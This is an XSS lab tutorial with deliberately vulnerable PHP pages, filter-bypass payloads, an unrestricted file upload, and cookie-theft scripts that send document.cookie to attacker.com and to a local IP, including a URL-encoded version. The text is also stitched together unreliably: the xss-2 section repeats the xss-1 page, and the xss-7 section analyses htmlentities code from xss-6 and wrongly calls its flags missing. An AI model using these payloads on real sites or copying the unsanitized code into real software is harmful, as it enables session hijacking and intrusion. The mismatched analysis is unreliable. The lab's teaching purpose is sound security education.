

# XSS-Vulnerable-Code-Analysis

## Cross-Site Scripting(XSS) Code Analysis and XSS Issue

---

### **Vulnerable Example: xss-1.php**

- vim xss-1.php

      <?php
       session_start();
         setcookie('admin', 'admin', time() + (60 * 60 * 24 * 7));
         $_SESSION['admin'] = 'admin';
          ?>
                                        
         <!DOCTYPE html>
         <html lang="en">
         <head>
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>XSS Vulnerability Lab</title>
        </head>
        <body>
                                        
         <h1>Welcome To Armour Infosec</h1>

            <?php
          // Vulnerable: directly echoing user input without sanitization, intentional for lab purposes
          if (isset($_REQUEST['user'])) {
             echo $_REQUEST['user'] . "!!";
          }
          ?>
                                        
         <p>Try injecting JavaScript or HTML code into the 'user' parameter in the URL to test reflected XSS:</p>
          <pre>?user=&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>
                                        
          </body>
         </html>

  The vulnerable code is using $_REQUEST, which combines GET, POST, and COOKIE variables, expanding the attack surface.

### Risks for Users

- Script Execution: Any visitor who clicks a crafted link or submits a manipulated form could have arbitrary JavaScript executed in their browser in the context of the vulnerable site.

- Cookie Theft: Attackers could use scripts to steal session cookies, hijack logins, or impersonate users.

- Session Security: The presence of admin cookies and session variables further increases attack value—they could be targeted for theft or manipulation.

### Common XSS Exploits (for Lab Purposes)

- Simple script execution:

      <script>alert('XSS')</script>

- Event handler injection:

      <img src=x onerror=alert('XSS')>

- Malicious payloads targeting cookies:

      <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

- HTML injection for phishing:

      <form action="https://malicious-site.com">Enter Password: <input type=password></form>

### Why Leave It Vulnerable?

For XSS labs and training, seeing raw, unsanitized output is essential for demonstrating the impact and exploitability of these attacks. It provides hands-on experience for attacking and later learning to defend real web applications.

Note:

Never deploy this or similar code in any environment that is accessible outside a controlled, ethical testing lab.

## Common XSS Exploits (for Lab Purposes)

### 1. Basic Alert Payloads

          <script>alert(123);</script>
          <script>alert("Armour");</script>
          <script>alert(document.domain);</script>
          <script>alert(document.cookie);</script>

- These are simple JavaScript alert popups enclosed in <script> tags.

- They are commonly used to test if XSS vulnerabilities exist by triggering a popup box.

Details:


- alert(123); — Displays a numeric popup alert.

- alert("Armour"); — Displays a popup with the text "Armour".

- alert(document.domain); — Shows the domain of the current document (used to confirm the site context).

- alert(document.cookie); — Displays the user's cookies stored for the site, indicating successful access to sensitive info.

### 2. Cookie Theft via Image Request

    <script>var i=new Image; i.src="http://192.168.1.6/?"+document.cookie;</script>


### 3. URL-Encoded Versions of the Above Payloads

%3Cscript%3Evar%20i%3Dnew%20Image%3Bi.src%3D%22http%3A%2F%2F192.168.1.6%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E


- These are the URL-encoded versions of the image-based cookie theft payload.

- URL encoding is used to safely transmit special characters in URLs without breaking web requests or filters.

- When decoded, they become the same JavaScript payload as before.

- Attackers use URL-encoding to bypass input filters or WAFs that don't decode inputs before inspection.


## Summary

| Payload Type                                                | Purpose                                 | Explanation                                            |
|-------------------------------------------------------------|-----------------------------------------|--------------------------------------------------------|
| `<script>alert(...);</script>`                              | Proof of XSS vulnerability              | Shows popup alert to confirm vulnerability             |
| `<script>alert(document.cookie);</script>`                  | Test access to victim’s cookies         | Indicates potential for cookie theft                   |
| `<script>var i=new Image; i.src="..."+document.cookie;</script>` | Steal cookies via HTTP request          | Sends victim’s cookie to attacker's server             |
| `%3Cscript%3E...%3C%2Fscript%3E`                            | Encoded payload for bypassing input restrictions | Encodes special characters for evading filters |

---

### Importance for Security Testing and Labs

- These payloads are typical first steps in security assessments and penetration testing to confirm an XSS flaw.
- The cookie theft payload is a real-world attack vector that hackers use to hijack sessions.
- URL-encoded variants highlight the importance of comprehensive input decoding and normalization before filtering.

> **Always use such payloads responsibly within authorized testing environments or labs, never on unauthorized systems.**

---

### Why Leave It Vulnerable?

- For XSS labs and training, seeing raw, unsanitized output is essential for demonstrating the impact and exploitability of these attacks.
- It provides hands-on experience for attacking and later learning to defend real web applications.

> **Note:** Never deploy this or similar code in any environment that is accessible outside a controlled, ethical testing lab.

---



## **Vulnerable Example:** `xss-2.php`

      
      XSS-Vulnerable-Code-Analysis
      
      Cross-Site Scripting(XSS) Code Analysis and XSS Issue
      
      Vulnerable Example: xss-1.php
      
      vim xss-1.php
      
      <?php
      session_start();
      setcookie('admin', 'admin', time() + (60 * 60 * 24 * 7));
      $_SESSION['admin'] = 'admin';
      ?>
      <!DOCTYPE html>
      <html lang="en">
      <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <title>XSS Vulnerability Lab</title>
      </head>
      <body>
      <h1>Welcome To Armour Infosec</h1>
      <?php
      // Vulnerable: directly echoing user input without sanitization, intentional for lab purposes
      if (isset($_REQUEST['user']))
          echo $_REQUEST['user'] . "!";
      ?>
      <p>Try injecting JavaScript or HTML code into the 'user' parameter in the URL to test reflected XSS:</p>
      <pre>?user=&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>
      </body>
      </html>

# Code Analysis and XSS Issue

The provided PHP code snippet is designed to demonstrate a partially filtered but still vulnerable scenario for learning about Cross-Site Scripting (XSS) attacks in a lab environment.

---

## What the Code Does

            $user = $_REQUEST['user'];
            
            if (preg_match('/script/i', $user)) {
            die("Error");
            } else {
            echo $user . "!";
            }

- It takes user input from any HTTP request parameter named `user`.
- It checks if the string "script" (case-insensitive) appears anywhere in the input.
    - If yes, it terminates execution and returns "Error".
    - If no, it outputs the user input directly without any encoding or further sanitization followed by "!".
- Because `$_REQUEST` includes query parameters, POST data, and cookies, this broadens opportunities for injection vectors.

---

## Why This Code is Still Vulnerable to XSS

1. **Naive Filtering:**  
   The filter only looks for the keyword "script" which attempts to block traditional `<script>` tag payloads. However:
    - Many XSS payloads do not use `<script>` tags.
    - Tags such as `<img>`, `<svg>`, `<iframe>`, or event handlers like `onerror`, `onload`, `onclick` can execute JavaScript without containing "script".
    - Attackers may obfuscate payloads by inserting spaces, using different cases, or splitting the word "script" to circumvent the filter.
2. **No Output Encoding:**  
   Even inputs that do not contain "script" are echoed raw inside the HTML page. This enables injection of arbitrary HTML and JavaScript.

---

## Example Bypasses for the Filter

These payloads do **not** contain the string "script" but can still execute JavaScript:

      <img src="x" onerror="alert('XSS')"> <svg onload=alert('XSS')> <body onload=alert('XSS')> <a href="javascript:alert('XSS')">Click me</a> <form action="javascript:alert('XSS')"> ```

     ## Lab Use Case

This partial filter simulates a realistic but flawed defense seen in some poorly protected web apps.

- It allows learners to practice generating valid XSS payloads that bypass simple keyword blocking, improving understanding of modern XSS attack vectors.
- The direct echoing of unsanitized content shows the importance of context-aware encoding and input validation.

---

## Summary

| Aspect         | Details                                                                       |
|----------------|-------------------------------------------------------------------------------|
| Filter         | Blocks any input containing `"script"` (case-insensitive)                     |
| Vulnerability  | Allows any HTML or JS input without `"script"` in it                          |
| Attack Vectors | Event handlers, other HTML tags, obfuscated inputs                            |
| Risk           | Reflected XSS leading to cookie theft, session hijacking, phishing, etc.      |
| Suitable For   | Teaching bypass techniques to naive filters                                   |

 ## vim xss-5.php

      <?php
      session_start();
      setcookie('admin','admin', time() + (60 * 60 * 24 * 7));
      $_SESSION['admin'] = 'admin';
      ?>
      <!DOCTYPE html>
      <html lang="en">
      <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <title>XSS Lab - Simple Alert Filter</title>
      </head>
      <body>
      <h1>Welcome To Armour Infosec</h1>
      
      <?php
      if (isset($_REQUEST['user'])) {
          $user = $_REQUEST['user'];
          // Naive filter to block explicit unescaped string 'alert' (case-insensitive)
          if (preg_match('/alert/i', $user)) {
              die("Error");
          } else {
              echo $user . "!";
          }
      }
      ?>
      </body>
      </html>
      

## How the Code Works

- The script starts a session, sets a cookie, and stores an admin variable in the session.
- It takes the `user` parameter from any HTTP request.
- If the input contains the substring `"alert"` (case-insensitive), the program halts with `"Error"`.
- If not, the input is echoed back to the page un-sanitized, followed by "!".

---

## XSS Issue

### Partial Filtering Only

- This code attempts to block classic XSS demonstrations by looking for `"alert"` in the input.
- It does not filter out HTML tags or JavaScript event handlers or any other JavaScript function but alert.

### No Output Encoding

- User input is rendered directly to the HTML response **without any escaping or sanitization**.

---

## Ways the Vulnerability Can Be Exploited

Even though the payloads like `<script>alert(1)</script>` or `onerror="alert(1)"` are blocked, most XSS payloads do **not** require the `"alert"` keyword. For example:

#### Script Execution via Other Functions:

      <script>confirm(1)</script> <script>prompt(1)</script>

#### HTML/JavaScript Event Handlers:

      <img src=x onerror=confirm(1)> <span onload=confirm(1)> ```

- Arbitrary HTML Injection:
  
      <li style="color:red" onmousemove="console.log(1)">Hover Me</li>

- JavaScript URL Vectors:

      <a href='javascript:console.log(1)'>Click me</a>

### Why This Remains Vulnerable

- The filter only looks for one keyword: "alert".

- Many other vectors, methods, and JavaScript functions exist for showing XSS, stealing cookies, or exploiting accounts.

- No output encoding or sanitization means any excluded string is rendered as HTML/JS.

### Conclusion

- This is a classic example of an insufficient, naive filter. It is a valuable exercise for students to learn:

    - How input blacklists can be trivially bypassed.


## Vulnerable Example: xss-6.php

### vim xss-6.php
      
      <?php
      session_start();
      setcookie('admin', 'admin', time() + (60 * 60 * 24 * 7));
      $_SESSION['admin'] = 'admin';
      ?>
      
      <!DOCTYPE html>
      <html lang="en">
      <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <title>XSS-6</title>
      </head>
      <body>
      <h1>Welcome To Armour Infosec</h1>
      
      <?php
      if (isset($_REQUEST['user'])) {
          $user = $_REQUEST['user'];
          // Encoding user input with htmlentities to safely display it
          // This prevents XSS by escaping HTML special characters
          echo htmlentities($user, ENT_QUOTES | ENT_HTML5, 'UTF-8') . "!";
      }
      ?>
      </body>
      </html>


## Vulnerable Example: xss-7.php

### vim xss-7.php

      <?php
      // Display POST data and uploaded file information (for debugging and demonstration)
      print_r($_POST);
      print_r($_FILES);
      
      if (isset($_POST['upload'])) {
      
          if ($_FILES['file']['error']) {
              echo "Error";
              die();
          } else {
              echo "Name: " . $_FILES['file']['name'] . "<br />";
              echo "File Type: " . $_FILES['file']['type'] . "<br />";
              echo "Size: " . $_FILES['file']['size'] . "<br />";
              echo "Temp File: " . $_FILES['file']['tmp_name'] . "<br />";
      
              // NOTE: Using original filename without sanitization - vulnerable to path traversal and overwriting
              // The move_uploaded_file() call allows uploading any type of file without restriction
              if (move_uploaded_file($_FILES['file']['tmp_name'], 'upload/' . $_FILES['file']['name'])) {
                  echo "File Uploaded Successfully";
              } else {
                  echo "Could not Upload File";
              }
          }
      }
      ?>
      <!DOCTYPE html>
      <html lang="en">
      <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <title>XSS - File Upload Lab</title>
      </head>
      <body>
      
      <form action="xss-7.php" method="POST" enctype="multipart/form-data">
          <input type="file" name="file">
          <input type="submit" name="upload" value="Upload">
      </form>
      
      </body>
      </html>
      

### Summary:

- The code you have shown is not vulnerable to basic reflected XSS, as it applies htmlentities() on output.

- If your goal is to have an intentionally vulnerable lab version, then using htmlentities() must be avoided or removed.

- If the goal is to analyze XSS from a security perspective, this code demonstrates safe output encoding practice in PHP.

### Recommendation for Lab Use:

- To keep this vulnerable (for XSS testing), avoid using htmlentities() on output.

- Instead, output the raw user input directly (e.g., echo $user . "!";) with no encoding.

- Alternatively, use minimal or partial filters that are easy to bypass.

### Further Reading and Context

- XSS vulnerabilities typically arise when untrusted user inputs are reflected back in HTTP responses without encoding or sanitization.

- Using functions like htmlentities() safely encodes user-supplied input to prevent script execution.

- Proper context-aware encoding is critical based on where the output is inserted (HTML element, attribute, JavaScript code).

- Some advanced attacks attempt to encode payloads in ways that bypass common but improperly used filters.

### How it Works:

- The code retrieves user input from the HTTP request parameter: user (via GET, POST, or COOKIE).

- It outputs the input after processing it with htmlentities().

- htmlentities() converts special HTML characters (like <, >, ") into their respective HTML entities (e.g., < becomes &lt;), which prevents the browser from interpreting them as executable HTML or JavaScript.

- Therefore, this prevents Cross-Site Scripting (XSS) in typical cases because scripts embedded as <script> ... </script> tags or event handlers are neutralized.

### Why the Code is Typically Not Vulnerable (Due to htmlentities):

- Output Encoding: By encoding HTML special characters, any injected script tags or JavaScript code will be rendered as plain text on the page, not executed.

- No direct injection of active code: This is the most effective base prevention for reflected XSS.

- UTF-8 and flags: The example is missing extra flags for htmlentities() like ENT_QUOTES | ENT_HTML5 and explicit UTF-8 charset, which are best practice to encode quotes and support full character sets. But the basic functionality is intact.

### Potential Limitations (for Advanced Attacks or Misuse):

- If the output context changes (e.g., inserting user input inside a JavaScript block or HTML attribute without proper context-aware encoding), htmlentities() alone is insufficient.

- If some filtering occurs before htmlentities() that modifies the input unexpectedly, it might introduce edge cases.

- If the charset is not explicitly set, certain special Unicode problems may occur (but this is rare with modern UTF-8 setups).

- Some advanced attackers may attempt to encode payloads using ways that browsers will normalize (not commonly or properly used).
